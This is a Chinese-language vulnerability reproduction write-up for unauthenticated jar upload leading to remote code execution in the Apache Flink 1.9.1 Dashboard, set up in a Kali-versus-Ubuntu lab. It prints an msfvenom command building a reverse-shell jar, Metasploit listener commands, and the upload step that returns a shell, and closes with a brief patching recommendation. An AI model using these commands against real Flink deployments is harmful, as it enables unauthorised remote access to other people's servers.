# 0x00简介

Apache Flink是近几年大火的数据处理引擎。受到各大厂商的推崇并且已经应用与实际的业务场景中。很多公司在进行选型的时候都会选择Apache
Flink作为选型的对象。Flink核心是一个流式的数据流执行引擎，其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。基于流执行引擎，Flink提供了诸多更高抽象层的API以便用户编写分布式任务。

# 0x01漏洞概述

攻击者可直接在Apache Flink Dashboard页面中上传任意jar包，从而达到远程代码执行的目的

# 0x02影响范围

到目前Apache Flink 1.9.1版本

# 0x03环境搭建

攻击机：kali

受害机：ubuntu16

1\. 安装java8环境，自行百度教程

![](https://image.3001.net/images/20201203/1606981433_5fc897399c47ffe22d72d.jpg!small)

2\. 下载Flink1.9.1版本，然后解压安装包

Flink下载地址：https://archive.apache.org/dist/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz

解压 tar -zxvf

![](https://image.3001.net/images/20201203/1606981446_5fc89746533908fedbb86.jpg!small)

3\. 进入bin目录运行./start-cluster.sh启动环境

![](https://image.3001.net/images/20201203/1606981454_5fc8974eed7d0f997ae7f.jpg!small)

4.在浏览器打开,出现以下界面表示安装成功

![](https://image.3001.net/images/20201203/1606981463_5fc89757129ec2abb822c.jpg!small)

# 0x04漏洞复现

1\. 首先使用kali生成jar的后门包

msfvenom -p java/meterpreter/reverse_tcp LHOST=IP LPORT=port -f jar >
shell.jar

![](https://image.3001.net/images/20201203/1606981471_5fc8975fce036f77ab7dd.jpg!small)

2.使用msfconsole监听shell设置的端口

use exploit/multi/handler

set payload java/shell/reverse_tcp

![](https://image.3001.net/images/20201203/1606981479_5fc89767caa545656a1ed.jpg!small)

![](https://image.3001.net/images/20201203/1606981488_5fc897701fd79ff863c98.jpg!small)

3.run开启监听

![](https://image.3001.net/images/20201203/1606981501_5fc8977d4d27dd83e7b55.jpg!small)

4.把制作好的shell.jar包访问目标站点并上传shell.jar

![](https://image.3001.net/images/20201203/1606981513_5fc89789c4928e71a7813.jpg!small)

5.点击Submit触发漏洞，反弹回了shell

![](https://image.3001.net/images/20201203/1606981525_5fc89795c791bb26e65a9.jpg!small)

# 0x05修复建议

更新官方补丁或更新最新版本

